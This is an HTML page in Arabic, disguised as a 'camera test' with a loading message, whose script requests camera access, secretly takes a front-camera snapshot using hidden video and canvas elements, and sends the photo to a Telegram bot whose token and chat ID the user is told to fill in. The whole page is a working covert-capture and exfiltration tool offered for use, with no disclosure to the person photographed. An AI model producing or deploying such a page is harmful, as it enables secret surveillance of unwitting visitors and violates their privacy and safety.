<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>اختبار الكاميرا</title>
    <style>
        body { font-family: Tahoma, sans-serif; text-align: center; margin-top: 50px; background: #f4f4f9; }
        video, canvas { display: none; }
        .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
    </style>
</head>
<body>

    <div class="box">
        <h2>جاري تحميل الصفحة...</h2>
        <p id="status">يرجى السماح بالوصول إلى الكاميرا للمتابعة.</p>
    </div>

    <!-- عناصر خفية لالتقاط الصورة -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ضع هنا توكن البوت الخاص بك وهنا الـ Chat ID الخاص بك
        const BOT_TOKEN = 'ضع_التوكن_هنا';
        const CHAT_ID = 'ضع_رقم_الـ_Chat_ID_هنا';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status');

        // طلب إذن فتح الكاميرا
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                statusText.innerText = "جاري التقاط الصورة...";
                
                // ننتظر ثانية واحدة حتى تعمل الكاميرا وتستقر الصورة
                setTimeout(() => {
                    takeSnapshot();
                    // إيقاف الكاميرا بعد التقاط الصورة
                    stream.getTracks().forEach(track => track.stop());
                }, 1500);
            })
            .catch(err => {
                statusText.innerText = "تم رفض إذن الكاميرا أو حدث خطأ.";
                console.error(err);
            });

        function takeSnapshot() {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى صيغة تناسب الإرسال (Blob)
            canvas.toBlob(blob => {
                sendToTelegram(blob);
            }, 'image/jpeg', 0.8);
        }

        function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'capture.jpg');

            // إرسال الصورة مباشرة إلى سيرفرات تلجرام عبر بوتك
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    statusText.innerText = "شكراً لك! تم الانتهاء بنجاح.";
                } else {
                    statusText.innerText = "حدث خطأ أثناء الإرسال للبوت.";
                }
            })
            .catch(error => {
                console.error('Error:', error);
                statusText.innerText = "فشل الاتصال.";
            });
        }
    </script>

</body>
</html>
